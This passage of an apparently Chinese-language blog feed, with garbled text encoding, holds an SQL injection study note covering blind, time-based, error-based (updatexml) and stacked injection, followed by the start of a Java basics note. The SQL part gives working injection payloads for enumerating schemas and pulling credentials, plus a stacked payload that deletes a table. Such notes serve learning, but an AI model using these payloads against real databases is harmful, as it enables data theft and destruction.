substr(password,1,1)=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-comment">#;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥ä¸æ–­æ”¹å˜æ¯”è¾ƒçš„å­—ç¬¦ï¼Œé€‰å–æ‰€æœ‰å¯æ˜¾ç¤ºå­—ç¬¦å»éå†ï¼Œå½“çŒœä¸­çœŸæ­£çš„è¿”å›å€¼æ—¶ï¼ŒæœåŠ¡å™¨è¿”å›ç”¨æˆ·å­˜åœ¨ã€‚</p><p>é™¤äº†æˆªå–å­—ç¬¦ä¸²ï¼Œè¿˜èƒ½æ›¿æ¢æŸä¸ªå­—ç¬¦</p><p>å°†<code>admin</code> çš„ç¬¬ 4 åˆ° 6 ä¸ªå­—ç¬¦æ›¿æ¢ä¸º ***</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">update</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> username = <span class="hljs-built_in">substr</span>(username,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)||<span class="hljs-string">&#x27;***&#x27;</span>||<span class="hljs-built_in">substr</span>(username,<span class="hljs-number">7</span>) <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span>;<br></code></pre></td></tr></table></figure><p>åœ¨ä¸ä½¿ç”¨è”åˆæ³¨å…¥å’Œå›æ˜¾çš„æ–¹å¼æ‹¿åˆ°æ•°æ®</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) = <span class="hljs-string">&#x27;a&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="MID-å‡½æ•°æˆªå–å­—ç¬¦ä¸²"><a href="#MID-å‡½æ•°æˆªå–å­—ç¬¦ä¸²" class="headerlink" title="MID()å‡½æ•°æˆªå–å­—ç¬¦ä¸²"></a><strong><code>MID()</code>å‡½æ•°æˆªå–å­—ç¬¦ä¸²</strong></h3><p>ä¸ <code>substr()</code>æ¯”è¾ƒåƒ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mid</span>(<span class="hljs-string">&quot;butt3rf1y&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>);// è¿”å› â€œbutâ€<br><span class="hljs-attribute">substr</span>(<span class="hljs-string">&quot;butt3rf1y&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>);// <span class="hljs-string">&quot;but&quot;</span><br></code></pre></td></tr></table></figure><h3 id="CONCAT-å‡½æ•°æ‹¼æ¥å­—ç¬¦ä¸²"><a href="#CONCAT-å‡½æ•°æ‹¼æ¥å­—ç¬¦ä¸²" class="headerlink" title="CONCAT()å‡½æ•°æ‹¼æ¥å­—ç¬¦ä¸²"></a><strong><code>CONCAT()</code>å‡½æ•°æ‹¼æ¥å­—ç¬¦ä¸²</strong></h3><p>å¯ä»¥å‡å°‘æŸ¥è¯¢è·³è½¬æ¬¡æ•°</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">concat</span>(<span class="hljs-params">string1,string2,...</span>)</span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> concat(username,<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-keyword">password</span>),<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>;<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL14.png"></p><h2 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h2><p>åˆ©ç”¨è¯­å¥æ‰§è¡Œæ—¶é—´åˆ¤æ–­çœŸå‡</p><h3 id="IF-å‡½æ•°"><a href="#IF-å‡½æ•°" class="headerlink" title="IF() å‡½æ•°"></a><code>IF()</code> å‡½æ•°</h3><p>åˆ¤æ–­æŒ‡å®šæ¡ä»¶æ˜¯å¦æˆç«‹ï¼Œæ ¹æ®ç»“æœè¿”å›ä¸åŒçš„å€¼</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">if</span><span class="hljs-params">(condition,value_if_true,value_if_false)</span>;<br><br><span class="hljs-string">//</span> <span class="hljs-literal">true</span>:æ¡ä»¶æˆç«‹æ—¶è¦è¿”å›çš„å€¼<br><span class="hljs-string">//</span> <span class="hljs-literal">false</span>:æ¡ä»¶ä¸æˆç«‹æ—¶è¦è¿”å›çš„å€¼<br></code></pre></td></tr></table></figure><h3 id="SLEEP-å‡½æ•°"><a href="#SLEEP-å‡½æ•°" class="headerlink" title="SLEEP()å‡½æ•°"></a><code>SLEEP()</code>å‡½æ•°</h3><p>ç¨‹åºæ‰§è¡Œæ—¶ï¼Œä¼šæš‚åœæŒ‡å®šç§’æ•°</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">sleep</span></span>(<span class="hljs-variable">seconds</span>)</span><br></code></pre></td></tr></table></figure><p>æ¯”å¦‚</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> user <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">if</span>(<span class="hljs-params">sleep(<span class="hljs-number">5</span></span>),1,0)</span>;<br><br><span class="hljs-comment">//å¦‚æœä¸å­˜åœ¨ç”¨æˆ·åä¸º admin çš„ç”¨æˆ·ï¼Œè¯­å¥å°†ç«‹å³è¿”å›ç»“æœï¼Œå¦åˆ™æš‚åœ 5s å†è¿”å›ç»“æœ</span><br></code></pre></td></tr></table></figure><p>å»¶æ—¶å‡½æ•° <code>SLEEP()</code> æˆ– <code>BENCHMARK()</code> å‡½æ•°æ¥åˆ¤æ–­æ˜¯å¦æ³¨å…¥æˆåŠŸ</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ASCII(substr(username),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">97</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>);<br><br>// å¦‚æœç”¨æˆ·è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªç”¨æˆ·åå­—ç¬¦ä¸ºå­—æ¯ aï¼Œåˆ™ç¨‹åºä¼šæš‚åœ <span class="hljs-number">5</span>s,å¦åˆ™è¿”å› <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="BENCHMARK-å‡½æ•°"><a href="#BENCHMARK-å‡½æ•°" class="headerlink" title="BENCHMARK()å‡½æ•°"></a><code>BENCHMARK()</code>å‡½æ•°</h3><p>ç”¨äºé‡å¤æ‰§è¡ŒæŒ‡å®šè¯­å¥</p><p>ï¼ˆé‡å¤æ‰§è¡Œæ¬¡æ•°ï¼Œé‡å¤æ‰§è¡Œè¯­å¥ï¼‰</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">benchmark</span><span class="hljs-params">(count,expr)</span></span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(benchmark(<span class="hljs-number">10</span>,md5(<span class="hljs-string">&#x27;butt3rf1y&#x27;</span>)),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br><br>// å¦‚æœæ•°æ®åº“ä¸­ä¸å­˜åœ¨ç”¨æˆ·åä¸º <span class="hljs-keyword">admin</span> çš„ç”¨æˆ·ï¼Œé‚£ä¹ˆè¯¥è¯­å¥å°†ä¼šç«‹å³è¿”å›ï¼›å¦åˆ™ï¼Œç¨‹åºå°†ä¼šé‡å¤æ‰§è¡Œ md5(<span class="hljs-string">&#x27;butt3rf1y&#x27;</span>) å‡½æ•° <span class="hljs-number">10</span> æ¬¡åå†è¿”å›ç»“æœ<br></code></pre></td></tr></table></figure><h3 id="æ—¶é—´æˆ³"><a href="#æ—¶é—´æˆ³" class="headerlink" title="æ—¶é—´æˆ³"></a>æ—¶é—´æˆ³</h3><p><strong><code>unix_timestamp()</code> å‡½æ•°</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> username,password <span class="hljs-keyword">from</span> user <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">if</span>(<span class="hljs-params">unix_timestamp</span>)&gt;1382772838,<span class="hljs-title">sleep</span>(<span class="hljs-params"><span class="hljs-number">5</span></span>),0)</span>;<br><br><span class="hljs-comment">//å¦‚æœå½“å‰æ—¶é—´æˆ³å¤§äº 1382772838,åˆ™ç¨‹åºä¼šæš‚åœ 5s,å¦åˆ™è¿”å› 0</span><br></code></pre></td></tr></table></figure><h3 id="å‡½æ•°è¿”å›å€¼"><a href="#å‡½æ•°è¿”å›å€¼" class="headerlink" title="å‡½æ•°è¿”å›å€¼"></a>å‡½æ•°è¿”å›å€¼</h3><p>åˆ©ç”¨å‡½æ•°è¿”å›å€¼åˆ¤æ–­æ˜¯å¦æ³¨å…¥æˆåŠŸ</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">length</span>(username)=<span class="hljs-number">4</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h1 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h1><p>é€šè¿‡æŠ¥é”™è·å–ä¿¡æ¯</p><h2 id="updatexml-å‡½æ•°"><a href="#updatexml-å‡½æ•°" class="headerlink" title="updatexml()å‡½æ•°"></a><code>updatexml()</code>å‡½æ•°</h2><p>ç”¨äºæ›´æ–° xml æ ¼å¼æ•°æ®</p><p>ï¼ˆè¦æ›´æ–°çš„ xml æ•°æ®ï¼Œè¦æ›´æ–°çš„èŠ‚ç‚¹è·¯å¾„ï¼Œæ›´æ–°çš„èŠ‚ç‚¹å€¼ï¼‰</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">updatexml</span><span class="hljs-params">(xml_target,xpath_expr,new_value)</span></span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°æœ‰ä¸€ä¸ªç¼ºé™·ï¼Œå¦‚æœäºŒä¸ªå‚æ•°åŒ…å«<strong>ç‰¹æ®Šç¬¦å·</strong>æ—¶ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”ä¼šç¬¬äºŒ ä¸ªå‚æ•°çš„å†…å®¹æ˜¾ç¤ºåœ¨æŠ¥é”™ä¿¡æ¯ä¸­</p><p>æ¯”å¦‚</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-number">0x7e</span>,<span class="hljs-number">3</span>);<br><br>ä¼šæŠ¥é”™ï¼šXPATH syntax error: <span class="hljs-string">&#x27;~&#x27;</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å¯ä»¥ç”¨ <code>concat()</code> å‡½æ•°å°†æŸ¥è¯¢è¯­å¥å’Œç‰¹æ®Šç¬¦å·æ‹¼æ¥åœ¨ä¸€èµ·</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,version()),<span class="hljs-number">3</span>);<br><br>// XPATH syntax error: <span class="hljs-string">&#x27;~8.0.40&#x27;</span><br></code></pre></td></tr></table></figure><p><code>updatexml()</code>æœ‰é•¿åº¦é™åˆ¶ï¼Œå¯ä»¥ç”¨ <code>limit()</code>å’Œ<code>substr()</code> å‡½æ•°</p><p><strong><code>limit()</code> å‡½æ•°</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">3</span>);<br><br>//å¯ä»¥ä¸æ–­æ”¹å˜ <span class="hljs-keyword">limit</span> num,<span class="hljs-number">1</span> çš„å€¼é€è¡Œè·å–<br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/QL15.png"></p><p><strong><code>substr()</code>å‡½æ•°</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,substr((<span class="hljs-keyword">select</span> group_concat(username) <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>),<span class="hljs-number">1</span>,<span class="hljs-number">31</span>)),<span class="hljs-number">3</span>);<br><br>// XPATH syntax error: <span class="hljs-string">&#x27;~admin,ctf,test,flag,user&#x27;</span><br></code></pre></td></tr></table></figure><p>è·å¾—æ‰€æœ‰æ•°æ®åº“</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata), <span class="hljs-number">1</span> , <span class="hljs-number">31</span>)),<span class="hljs-number">3</span>);<br><br>// XPATH syntax error: <span class="hljs-string">&#x27;~mysql,information_schema,perfor&#x27;</span><br></code></pre></td></tr></table></figure><p>è·å–æ‰€æœ‰è¡¨</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;mysql&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">31</span>)),<span class="hljs-number">3</span>);<br><br>//XPATH syntax error: <span class="hljs-string">&#x27;~columns_priv,component,db,defau&#x27;</span><br></code></pre></td></tr></table></figure><p>è·å–æ‰€æœ‰å­—æ®µ</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> username, <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;mysql&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span> = <span class="hljs-string">&#x27;db&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">31</span>)),<span class="hljs-number">3</span>); <br><br>// XPATH syntax error: <span class="hljs-string">&#x27;~Host,Db,User,Select_priv,Insert&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="EXTRACTVALUE-å‡½æ•°"><a href="#EXTRACTVALUE-å‡½æ•°" class="headerlink" title="EXTRACTVALUE()å‡½æ•°"></a><code>EXTRACTVALUE()</code>å‡½æ•°</h2><p>ä» XML æ ¼å¼çš„æ•°æ®ä¸­æå–æŒ‡å®šèŠ‚ç‚¹çš„å€¼</p><p>ï¼ˆè¦æå–èŠ‚ç‚¹å€¼çš„ XML æ•°æ®ï¼Œè¦æå–çš„èŠ‚ç‚¹è·¯å¾„ï¼‰</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">extractvalue</span><span class="hljs-params">(xml_target,xpath_expr)</span></span><br></code></pre></td></tr></table></figure><p>æŠ¥é”™å’Œ <code>updatexml()</code> å‡½æ•°ä¸€æ ·ï¼Œä½¿ç”¨ä¹Ÿå·®ä¸å¤šï¼Œä½†æ˜¯å°‘ä¸€ä¸ªå‚æ•° x</p><h1 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h1><p> ä¸€å † SQL è¯­å¥ (å¤šæ¡) ä¸€èµ·æ‰§è¡Œæ–¹æ³•</p><p>åœ¨æ‰§è¡Œ SQL è¯­å¥æ—¶ï¼Œå¦‚æœ SQL è¯­å¥ä¸­åŒ…å«å¤šä¸ª SQL è¯­å¥ï¼Œæ•°æ®åº“æœåŠ¡å™¨ä¼šä¾æ¬¡æ‰§è¡Œè¿™äº› SQL è¯­å¥ï¼Œä»è€Œå¯¼è‡´å¤šæ¬¡ SQL æ³¨å…¥æ”»å‡»ï¼ˆæ„Ÿè§‰æœ‰ç‚¹å°åƒçˆ†ç ´ï¼‰ã€‚é€šè¿‡åœ¨ SQL è¯­å¥ä¸­ä½¿ç”¨åˆ†å·ï¼ˆ;ï¼‰æ¥åˆ†éš”å¤šä¸ª SQL è¯­å¥ï¼Œä»è€Œå®ç°å †å æ³¨å…¥æ”»å‡»ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users;<span class="hljs-keyword">show</span> databases; <br></code></pre></td></tr></table></figure><p>å †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯<strong>ä»»æ„</strong>çš„è¯­å¥ã€‚</p><p>æ¯”å¦‚ç”¨æˆ·è¾“å…¥ï¼š1; DELETE FROM products </p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">Select</span> * <span class="hljs-keyword">from</span> products <span class="hljs-keyword">where</span> productid=<span class="hljs-number">1</span>;<span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> products<br></code></pre></td></tr></table></figure><p>å½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤</p><p>å¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒéƒ½é€‚åˆå †å æ³¨å…¥ï¼Œä¸”åœ¨å †å å‰è¿˜éœ€è¦çŸ¥é“ä¸€äº›ä¿¡æ¯æ‰èƒ½æ­£å¸¸æ³¨å…¥ã€‚</p><p>åªæ˜¯ä¸€äº›å¸¸è§çš„æ³¨å…¥ç±»å‹ï¼Œä»¥ååœ¨å­¦ä¹ è¿‡ç¨‹ä¸­è¿˜ä¼šé‡åˆ°æ–°çŸ¥è¯†ï¼Œåˆ°æ—¶å€™å†è¡¥å……å˜»å˜»~~~</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>SQL æ³¨å…¥</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java åŸºç¡€</title>
    <link href="/2024/11/09/Java/"/>
    <url>/2024/11/09/Java/</url>
    
    <content type="html"><![CDATA[<p>ä¸€äº›å­¦ä¹  Java çš„ç¬”è®°ï¼Œç¯‡å¹…æœ‰ç‚¹é•¿å˜»å˜» ^__^ ~</p><span id="more"></span><h1 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h1><h2 id="å…«å¤§æ•°æ®ç±»å‹"><a href="#å…«å¤§æ•°æ®ç±»å‹" class="headerlink" title="å…«å¤§æ•°æ®ç±»å‹"></a>å…«å¤§æ•°æ®ç±»å‹</h2><h6 id="æ•°å€¼å‹"><a href="#æ•°å€¼å‹" class="headerlink" title="æ•°å€¼å‹"></a>æ•°å€¼å‹</h6><p>â€‹1.æ•´æ•°ç±»å‹ï¼ˆbyte,short,int,longï¼‰</p><p>â€‹2.æµ®ç‚¹ç±»å‹ï¼ˆfloat,doubleï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">long</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span><span class="hljs-number">30L</span>;<span class="hljs-comment">// long å‹åŠ  L</span><br><span class="hljs-type">float</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> <span class="hljs-number">50.1F</span>;<span class="hljs-comment">// float å‹åŠ  F</span><br></code></pre></td></tr></table></figure><h6 id="å­—ç¬¦å‹ï¼ˆcharï¼‰2ä¸ªå­—èŠ‚"><a href="#å­—ç¬¦å‹ï¼ˆcharï¼‰2ä¸ªå­—èŠ‚" class="headerlink" title="å­—ç¬¦å‹ï¼ˆcharï¼‰2ä¸ªå­—èŠ‚"></a>å­—ç¬¦å‹ï¼ˆcharï¼‰2ä¸ªå­—èŠ‚</h6><h6 id="å¸ƒå°”å‹ï¼ˆbooleanï¼‰"><a href="#å¸ƒå°”å‹ï¼ˆbooleanï¼‰" class="headerlink" title="å¸ƒå°”å‹ï¼ˆbooleanï¼‰"></a>å¸ƒå°”å‹ï¼ˆbooleanï¼‰</h6><h2 id="å¼•ç”¨æ•°æ®ç±»å‹"><a href="#å¼•ç”¨æ•°æ®ç±»å‹" class="headerlink" title="å¼•ç”¨æ•°æ®ç±»å‹"></a>å¼•ç”¨æ•°æ®ç±»å‹</h2><p>ç±»ï¼ˆclassï¼‰ </p><p>æ¥å£ï¼ˆinterfaceï¼‰</p><p>æ•°ç»„ï¼ˆ[]ï¼‰</p><h1 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h1><h2 id="ç®—æœ¯è¿ç®—ç¬¦"><a href="#ç®—æœ¯è¿ç®—ç¬¦" class="headerlink" title="ç®—æœ¯è¿ç®—ç¬¦"></a>ç®—æœ¯è¿ç®—ç¬¦</h2><p>ï¼‹-ä½œä¸ºå•å…ƒè¿ç®—ç¬¦å­˜åœ¨æ—¶ï¼Œè¡¨ç¤ºæ­£è´Ÿ</p><p>1.ï¼‹</p><p>ï¼‹å·¦å³ä¸¤è¾¹æ²¡æœ‰å­—ç¬¦ä¸²ï¼Œåˆ™è¿›è¡Œæ•°å€¼è¿ç®—ã€‚</p><p>ï¼‹å·¦å³ä¸¤è¾¹æœ‰å­—ç¬¦ä¸²ï¼Œè¿›è¡Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œå¦‚æœä¸æ˜¯å­—ç¬¦ä¸²ä¼š<strong>è½¬æ¢æˆå­—ç¬¦ä¸²</strong>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-number">100</span>+<span class="hljs-number">98</span>);<span class="hljs-comment">//198</span><br>System.out.println(<span class="hljs-string">&#x27;a&#x27;</span>+<span class="hljs-number">1</span>);<span class="hljs-comment">//98</span><br>System.out.println(<span class="hljs-string">&quot;a&quot;</span>+<span class="hljs-number">1</span>+<span class="hljs-number">3</span>);<span class="hljs-comment">//a13</span><br>System.out.println(<span class="hljs-number">1</span>+<span class="hljs-number">3</span>+<span class="hljs-string">&quot;a&quot;</span>);<span class="hljs-comment">//4a</span><br></code></pre></td></tr></table></figure><p>2.%</p><p><strong>a%b=&#x3D;a-a&#x2F;b*b</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-number">10</span>%<span class="hljs-number">4</span>);<span class="hljs-comment">//2</span><br>System.out.println(-<span class="hljs-number">10</span>%<span class="hljs-number">4</span>);          <span class="hljs-comment">//-2</span><br>System.out.println(<span class="hljs-number">10</span>%-<span class="hljs-number">4</span>);<span class="hljs-comment">//2</span><br>System.out.println(-<span class="hljs-number">10</span>%-<span class="hljs-number">4</span>);<span class="hljs-comment">//-2 </span><br></code></pre></td></tr></table></figure><h2 id="é€»è¾‘è¿ç®—ç¬¦"><a 